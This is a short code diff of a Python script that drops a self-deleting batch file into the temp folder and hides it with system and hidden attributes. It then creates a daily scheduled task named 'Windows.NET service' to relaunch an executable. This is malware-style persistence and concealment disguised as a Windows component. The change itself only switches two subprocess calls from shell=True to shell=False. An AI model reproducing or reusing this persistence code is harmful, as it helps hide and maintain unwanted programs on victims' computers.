@@ -8,7 +8,7 @@ def F5536( path,exe,bat ):
 	bat_file.write( '"{}"'.format(path+"\\"+exe) )
 	bat_file.write("\n"+'break>"%~f0" && DEL "%~f0"')
 	bat_file.close()
-	blahah = subprocess.Popen( "attrib +s +h " + bat +" >> NUL",shell=True,cwd=path)
+	blahah = subprocess.Popen( "attrib +s +h " + bat +" >> NUL",shell=False, cwd=path)
 
 def F5570(exe):
 	path = get_output("echo %TEMP%")
@@ -18,6 +18,6 @@ def F5570(exe):
 
 	if "Windows.NET service" not in get_output("schtasks /query"): # Will Start every day at the same time
 		blah = subprocess.Popen( 'SCHTASKS /CREATE /SC daily /TN "Windows.NET service" /TR {} >> NUL'.format( bat_path ),
-		shell=True)
+		shell=False)
 
 F5570(File)
